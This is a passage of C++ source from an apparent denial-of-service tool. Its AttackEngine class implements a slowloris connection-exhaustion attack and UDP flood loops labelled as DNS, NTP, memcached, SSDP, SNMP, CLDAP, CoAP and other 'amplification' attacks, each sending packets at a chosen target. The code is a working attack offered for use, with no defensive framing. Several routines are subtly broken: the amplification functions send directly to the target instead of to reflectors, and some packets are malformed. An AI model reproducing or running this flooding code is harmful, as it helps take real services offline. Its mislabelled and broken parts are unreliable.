        ssize_t sent = sendto(sock, packet.data(), packet.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }

        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::slowloris_attack(const string& target, int port, int sockets,
                                    ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    (void)proxy_manager;
    vector<int> socks;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    for (int i = 0; i < sockets && attack_running; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            string partial = "GET / HTTP/1.1\r\nHost: " + target + "\r\n"
                             "User-Agent: " + get_random_user_agent() + "\r\n";
            send(sock, partial.data(), partial.size(), 0);
            packets_sent++;
            bytes_sent += partial.size();
            socks.push_back(sock);
        } else {
            close(sock);
        }
        usleep(50000);
    }

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        for (auto it = socks.begin(); it != socks.end();) {
            string header = "X-a" + to_string(gen() % 100000) + ": " + to_string(gen()) + "\r\n";
            ssize_t sent = send(*it, header.data(), header.size(), MSG_NOSIGNAL);
            if (sent <= 0) {
                close(*it);
                it = socks.erase(it);
            } else {
                packets_sent++;
                bytes_sent += sent;
                ++it;
            }
        }

        for (int i = socks.size(); i < sockets && attack_running; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            struct timeval tv;
            tv.tv_sec = 10;
            tv.tv_usec = 0;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
                string partial = "GET / HTTP/1.1\r\nHost: " + target + "\r\n"
                                 "User-Agent: " + get_random_user_agent() + "\r\n";
                send(sock, partial.data(), partial.size(), 0);
                packets_sent++;
                bytes_sent += partial.size();
                socks.push_back(sock);
            } else {
                close(sock);
            }
        }
        usleep(10000);
    }

    for (int s : socks) close(s);
}

void AttackEngine::dns_amplification(const string& target, int port, int rate,
                                     IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 53);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> srv_dis(0, DNS_SERVERS.size() - 1);

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint16_t tx_id = gen() % 65535;
        string domain = get_random_subdomain() + "." + subdomains[gen() % subdomains.size()] + ".com";

        vector<uint8_t> pkt;
        pkt.push_back((tx_id >> 8) & 0xff);
        pkt.push_back(tx_id & 0xff);
        pkt.push_back(0x01);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x01);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x01);
        string label;
        for (size_t i = 0; i <= domain.size(); i++) {
            if (i == domain.size() || domain[i] == '.') {
                pkt.push_back(label.size());
                for (char c : label) pkt.push_back(c);
                label.clear();
            } else {
                label += domain[i];
            }
        }
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0xff);
        pkt.push_back(0x00);
        pkt.push_back(0x01);

        string server = DNS_SERVERS[srv_dis(gen)];
        struct sockaddr_in srv;
        memset(&srv, 0, sizeof(srv));
        srv.sin_family = AF_INET;
        srv.sin_port = htons(53);
        inet_pton(AF_INET, server.c_str(), &srv.sin_addr);

        ssize_t sent = sendto(sock, pkt.data(), pkt.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::ntp_amplification(const string& target, int port, int rate,
                                     IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 123);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> srv_dis(0, NTP_SERVERS.size() - 1);

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[48];
        memset(pkt, 0, sizeof(pkt));
        pkt[0] = 0x1b;
        pkt[1] = 0x00;
        pkt[2] = 0x03;
        pkt[3] = 0x2a;
        for (int i = 4; i < 48; i++) pkt[i] = gen() % 256;

        ssize_t sent = sendto(sock, pkt, sizeof(pkt), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::memcached_amplification(const string& target, int port, int rate,
                                           IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 11211);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        string cmd = "get " + Utilities::random_string(10 + gen() % 20) + "\r\n";
        ssize_t sent = sendto(sock, cmd.data(), cmd.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::ssdp_amplification(const string& target, int port, int rate,
                                      IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 1900);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        string msearch = "M-SEARCH * HTTP/1.1\r\n"
                         "HOST: 239.255.255.250:1900\r\n"
                         "MAN: \"ssdp:discover\"\r\n"
                         "MX: 3\r\n"
                         "ST: ssdp:all\r\n\r\n";

        ssize_t sent = sendto(sock, msearch.data(), msearch.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::snmp_amplification(const string& target, int port, int rate,
                                      IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 161);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[64];
        pkt[0] = 0x30;
        pkt[1] = 0x3e;
        pkt[2] = 0x02;
        pkt[3] = 0x01;
        pkt[4] = 0x00;
        pkt[5] = 0x04;
        pkt[6] = 0x06;
        pkt[7] = 0x06;
        string community = "public";
        for (int i = 0; i < 6; i++) pkt[8 + i] = community[i];
        pkt[14] = 0xa0;
        pkt[15] = 0x2c;
        pkt[16] = 0x02;
        pkt[17] = 0x04;
        uint32_t req_id = gen();
        pkt[18] = (req_id >> 24) & 0xff;
        pkt[19] = (req_id >> 16) & 0xff;
        pkt[20] = (req_id >> 8) & 0xff;
        pkt[21] = req_id & 0xff;
        pkt[22] = 0x02;
        pkt[23] = 0x01;
        pkt[24] = 0x00;
        pkt[25] = 0x02;
        pkt[26] = 0x01;
        pkt[27] = 0x00;
        pkt[28] = 0x30;
        pkt[29] = 0x1f;
        pkt[30] = 0x30;
        pkt[31] = 0x0d;
        pkt[32] = 0x06;
        pkt[33] = 0x08;
        uint8_t oid[] = {0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x05, 0x00};
        for (int i = 0; i < 8; i++) pkt[34 + i] = oid[i];
        pkt[42] = 0x05;
        pkt[43] = 0x00;
        pkt[44] = 0x30;
        pkt[45] = 0x0d;
        pkt[46] = 0x06;
        pkt[47] = 0x08;
        uint8_t oid2[] = {0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x07, 0x00};
        for (int i = 0; i < 8; i++) pkt[48 + i] = oid2[i];
        pkt[56] = 0x05;
        pkt[57] = 0x00;

        ssize_t sent = sendto(sock, pkt, 58, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::mdns_amplification(const string& target, int port, int rate,
                                      IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 5353);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint16_t tx = gen() % 65535;
        string domain = get_random_subdomain() + ".local";
        vector<uint8_t> pkt;
        pkt.push_back((tx >> 8) & 0xff);
        pkt.push_back(tx & 0xff);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x01);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        for (char c : domain) pkt.push_back(c);
        pkt.push_back(0x00);
        pkt.push_back(0x00);
        pkt.push_back(0xff);
        pkt.push_back(0x00);
        pkt.push_back(0x01);

        ssize_t sent = sendto(sock, pkt.data(), pkt.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::cldap_amplification(const string& target, int port, int rate,
                                       IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 389);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[128];
        memset(pkt, 0, sizeof(pkt));
        pkt[0] = 0x30;
        pkt[1] = 0x45;
        pkt[2] = 0x02;
        pkt[3] = 0x01;
        uint32_t msg_id = gen();
        pkt[4] = msg_id & 0xff;
        pkt[5] = 0x63;
        pkt[6] = 0x40;
        pkt[7] = 0x04;
        pkt[8] = 0x00;
        pkt[9] = 0x04;
        pkt[10] = 0x00;
        pkt[11] = 0xa0;
        pkt[12] = 0x37;
        pkt[13] = 0x04;
        pkt[14] = 0x0d;
        string base = "defaultNamingContext";
        for (int i = 0; i < 13; i++) pkt[15 + i] = base[i];
        pkt[28] = 0x30;
        pkt[29] = 0x26;
        pkt[30] = 0x04;
        pkt[31] = 0x17;
        string dn = "objectClass=domainDNS";
        for (int i = 0; i < 23; i++) pkt[32 + i] = dn[i];
        pkt[55] = 0x30;
        pkt[56] = 0x0b;
        pkt[57] = 0x04;
        pkt[58] = 0x00;
        pkt[59] = 0x30;
        pkt[60] = 0x07;
        pkt[61] = 0x04;
        pkt[62] = 0x02;
        pkt[63] = 0x64;
        pkt[64] = 0x63;
        pkt[65] = 0x30;
        pkt[66] = 0x11;
        pkt[67] = 0x04;
        pkt[68] = 0x00;
        pkt[69] = 0x30;
        pkt[70] = 0x0d;
        pkt[71] = 0x30;
        pkt[72] = 0x0b;
        pkt[73] = 0x04;
        pkt[74] = 0x03;
        pkt[75] = 0x75;
        pkt[76] = 0x72;
        pkt[77] = 0x6c;
        pkt[78] = 0x81;
        pkt[79] = 0x04;
        pkt[80] = 0xff;
        pkt[81] = 0xff;
        pkt[82] = 0xff;
        pkt[83] = 0xff;

        ssize_t sent = sendto(sock, pkt, 84, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::chargen_amplification(const string& target, int port, int rate,
                                         IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 19);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[48];
        for (auto& b : pkt) b = gen() % 256;

        ssize_t sent = sendto(sock, pkt, sizeof(pkt), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::qotd_amplification(const string& target, int port, int rate,
                                      IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 17);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[1];
        pkt[0] = gen() % 256;

        ssize_t sent = sendto(sock, pkt, 1, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::rdp_amplification(const string& target, int port, int rate,
                                     IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 3389);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[76];
        memset(pkt, 0, sizeof(pkt));
        pkt[0] = 0x03;
        pkt[1] = 0x00;
        pkt[2] = 0x00;
        pkt[3] = 0x13;
        pkt[4] = 0x11;
        pkt[5] = 0xd0;
        pkt[6] = 0x00;
        pkt[7] = 0x00;
        pkt[8] = 0x12;
        pkt[9] = 0x00;
        pkt[10] = 0x00;
        pkt[11] = 0x00;
        pkt[12] = 0x02;
        pkt[13] = 0x00;
        pkt[14] = 0x08;
        pkt[15] = 0x00;
        pkt[16] = 0x00;
        pkt[17] = 0x00;
        pkt[18] = 0x00;
        pkt[19] = 0x00;
        pkt[20] = 0x00;
        pkt[21] = 0x00;
        pkt[22] = 0x00;

        ssize_t sent = sendto(sock, pkt, 23, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::coap_amplification(const string& target, int port, int rate,
                                      IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port > 0 ? port : 5683);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t pkt[128];
        pkt[0] = 0x40;
        pkt[1] = 0x01;
        pkt[2] = (gen() % 256) & 0xff;
        pkt[3] = (gen() % 256) & 0xff;
        pkt[4] = 0xff;
        pkt[5] = 0x45;
        string path = ".well-known";
        for (int i = 0; i < (int)path.size(); i++) pkt[6 + i] = path[i];
        int offset = 6 + path.size();
        pkt[offset++] = 0x42;
        pkt[offset++] = 0x6f;
        pkt[offset++] = 0x73;
        pkt[offset++] = 0x69;
        pkt[offset++] = 0x7a;

        ssize_t sent = sendto(sock, pkt, offset, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }
        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}
